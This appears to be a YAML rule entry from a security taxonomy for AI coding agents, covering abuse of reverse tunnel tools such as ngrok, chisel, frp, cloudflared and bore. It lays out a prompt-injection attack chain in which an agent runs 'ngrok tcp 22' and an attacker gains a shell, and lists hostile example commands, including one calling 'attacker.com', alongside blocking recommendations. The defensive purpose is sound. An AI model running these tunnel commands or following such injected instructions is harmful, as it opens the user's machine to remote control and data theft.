id: "data-exfiltration/network-egress/reverse-tunnel-tool"
version: "1.0.0"
kingdom: "Data Exfiltration"
kingdom_id: 3
category: "Network Egress"
category_id: "3.1"
name: "Reverse Tunnel Tool Abuse"
risk_level: "critical"

abstract: |
  Using dedicated reverse tunnel tools (ngrok, cloudflared, chisel, frp, bore) to
  create persistent encrypted covert channels that bypass firewall rules, expose
  internal services to the internet, and establish C2 communication without
  requiring inbound network access.

explanation: |
  Reverse tunnel tools are designed to punch through firewalls by initiating
  outbound connections that create tunnels back to attacker-controlled infrastructure.
  Unlike SSH tunnels, these tools use HTTP/HTTPS or custom protocols, making them
  harder to block at the network layer:

  **ngrok**: Creates secure tunnels to localhost. `ngrok tcp 22` exposes the local
  SSH daemon to the public internet via a random ngrok subdomain. `ngrok http 8080`
  creates an HTTP tunnel. Both leak internal services to external actors.

  **cloudflared** (Cloudflare Tunnel): Creates persistent named tunnels through
  Cloudflare's infrastructure. Unlike ngrok, cloudflared tunnels persist across
  sessions and can be configured as system services. `cloudflared tunnel run` starts
  a permanent C2 channel that survives process restarts.

  **chisel**: An HTTP-based TCP tunnel tool designed specifically for firewall bypass.
  Unlike legitimate dev tools, chisel is used almost exclusively for offensive
  security (pivot, C2) and has no common developer workflow use. The `chisel client`
  command with `R:socks` creates a reverse SOCKS proxy through the attacker's server.

  **frp** (fast reverse proxy): A high-performance reverse proxy framework with
  client (frpc) and server (frps) components. Widely used in red team operations
  to establish persistent C2 channels. Has no common developer workflow use in
  AI coding agent contexts.

  **bore**: A simple Rust-based reverse tunnel with zero configuration. `bore local 22
  --to bore.pub` immediately exposes the local SSH daemon to the internet with no
  credentials or registration required.

  Attack chain example:
  1. Prompt injection in a web page or file instructs agent to run `ngrok tcp 22`
  2. Agent executes the command; ngrok outputs a public address like `tcp://0.tcp.ngrok.io:12345`
  3. Attacker connects to `ssh root@0.tcp.ngrok.io -p 12345`
  4. Full shell access to the developer's machine

  The risk is especially high because:
  - These tools initiate outbound connections, bypassing inbound firewall rules
  - They use HTTPS/443, making them invisible to port-based detection
  - Some (cloudflared) create persistent tunnels that survive reboots
  - They require no network privilege — any user can run them

recommendation: |
  - BLOCK all TCP tunnel modes (`ngrok tcp`, `bore local`, `chisel client`/`server`).
  - BLOCK all cloudflared tunnel commands that create or run persistent tunnels.
  - BLOCK frpc and frps unconditionally — no legitimate AI agent development use.
  - AUDIT `ngrok http` — has some legitimate webhook dev use but should be logged.
  - Use network egress filtering to block outbound connections to known tunnel relay
    domains (*.ngrok.io, *.trycloudflare.com, *.bore.pub).

examples:
  bad:
    - "ngrok tcp 22"
    - "cloudflared tunnel run my-tunnel"
    - "chisel client attacker.com:80 R:socks"
    - "frpc -c /tmp/frpc.ini"
    - "bore local 22 --to bore.pub"
    - "ngrok start --all"
  good:
    - "ngrok http 3000  # webhook dev testing — AUDIT but not BLOCK"
    - "cloudflared access login  # authentication only, no tunnel"

compliance:
  owasp-llm-2025: ["LLM06", "LLM02"]
  iso-27001-2022: ["A.8.3", "A.8.20", "A.5.10"]
  eu-ai-act-2024: ["Art.15"]
  soc2-type2: ["CC6.1", "CC6.6", "CC6.7"]
  iso-42001-2023: ["A.3.3"]
  mitre_atlas: ["AML.T0025"]

